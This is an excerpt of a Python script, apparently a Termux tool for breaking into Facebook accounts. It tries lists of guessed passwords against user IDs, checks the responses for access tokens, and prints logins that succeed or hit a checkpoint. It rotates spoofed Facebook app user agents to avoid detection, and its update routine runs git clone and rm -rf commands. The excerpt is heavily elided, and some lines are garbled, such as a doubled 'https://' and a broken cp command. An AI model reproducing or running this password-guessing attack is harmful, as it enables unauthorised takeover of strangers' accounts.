...
#AUTHOR : ABIR.JOKAR (MENTEL 404)

#OPEN SOURCE :)

#DON'T FORGET TO GIVE CREDIT TO MR. KING
...
def main():
	...
	print("\033[96;1m  [J] JOIN ARIYAN SHUVO GROUP \033[92;1m✘\033[91;1m✘")
...
def log_sel():
	...
	if sel == "":
		...
		subprocess.check_output(["am", "start", "https://https://www.facebook.com/rafivaim.m.m"])
		...
		try:
			...
			os.system("git clone https://github.com/JokarAbir")

			os.system("rm -rf abir.py")

			os.system("cp -mr/abir.py \\.")

			os.system("rm -rf abir")
		...
		subprocess.check_output(["am", "start", "https://t.me/........"])
...
def menu():
    ...
    try:
        ...
        os.system("rm -rf abir_token.txt")
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				if "www.facebook.com" in data.json()['error_msg']:
					...
					print(" \033[1;33m[AKASH-CP] "+uid+" | "+pass1+"\033[0;97m")
					...
					if "access_token" in data.text and "EAAA" in data.text:
						...
						print(" \033[1;32m[AKASH-OK] "+uid+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in data.json()['error_msg']:
							...
							print(" \033[1;33m[AKASH-CP] "+uid+" | "+pass2+"\033[0;97m")
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								print(" \033[1;32m[AKASH-OK] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in data.json()['error_msg']:
									...
									print(" \033[1;33m[AKASH-CP] "+uid+" | "+pass3+"\033[0;97m")
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										print(" \033[1;32m[AKASH-OK] "+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in data.json()['error_msg']:
											...
											print(" \033[1;33m[AKASH-CP] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												print(" \033[1;32m[AKASH-OK] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													print(" \033[1;33m[AKASH-CP] "+uid+" | "+pass5+"\033[0;97m")
													...
													if "access_token" in data.text and "EAAA" in data.text:
														...
														print(" \033[1;32m[AKASH-OK] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in data.json()['error_msg']:
															...
															print(" \033[1;33m[AKASH-CP] "+uid+" | "+pass6+"\033[0;97m")
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																print(" \033[1;32m[AKASH-OK] "+uid+" | "+pass7+"\033[0;97m")
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	...
																	print(" \033[1;33m[AKASH-CP] "+uid+" | "+pass7+"\033[0;97m")
																	...
																	if "access_token" in data.text and "EAAA" in data.text:
																		...
																		print(" \033[1;32m[AKASH-OK] "+uid+" | "+pass8+"\033[0;97m")
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			...
																			print(" \033[1;33m[AKASH-CP] "+uid+" | "+pass8+"\033[0;97m")
...
def crack_select():
	...
	def main(arg):
		...
		_JokarAbir= random.choice(["Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]", "[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]", "Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]", "Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]", "Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"])
					...
					if "access_token" in data.text and "EAAA" in data.text:
						...
						if "www.facebook.com" in data.json()['error_msg']:
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								print(" \033[1;32m[RAFI-OK] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in data.json()['error_msg']:
									...
									print(" \033[1;33m[ABIR-CP] "+uid+" | "+pass3+"\033[0;97m")
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										print(" \033[1;32m[ABIR-OK] "+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in data.json()['error_msg']:
											...
											print(" \033[1;33m[ABIR-CP] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													if "access_token" in data.text and "EAAA" in data.text:
													 ...
													 print(" \033[1;32m[ABIR-OK] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in data.json()['error_msg']:
															...
															print(" \033[1;33m[RAFI-CP] "+uid+" | "+pass6+"\033[0;97m")
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																print(" \033[1;32m[ABIR-OK] "+uid+" | "+pass7+"\033[0;97m")
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	...
																	print(" \033[1;33m[ABIR-CP] "+uid+" | "+pass7+"\033[0;97m")
